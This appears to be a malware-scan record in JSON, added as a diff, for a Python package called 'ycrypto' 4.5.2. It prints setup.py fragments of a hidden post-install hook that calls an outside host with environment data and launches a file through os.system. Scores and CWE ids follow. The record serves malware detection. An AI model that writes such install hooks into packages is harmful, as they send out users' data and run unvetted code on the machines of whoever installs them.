@@ -1,0 +1,42 @@
+{
+  "package_metadata": {
+    "name": "ycrypto",
+    "version": "4.5.2",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "https://linkedopports.com/pyp/resp.php"
+    ],
+    "process_spawns": [
+      "os.system('start '+filename)"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "setup(\n  name='ycrypto',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "            os.system('start '+filename)\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.875,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-94",
+      "CWE-200",
+      "CWE-78"
+    ]
+  }
+}
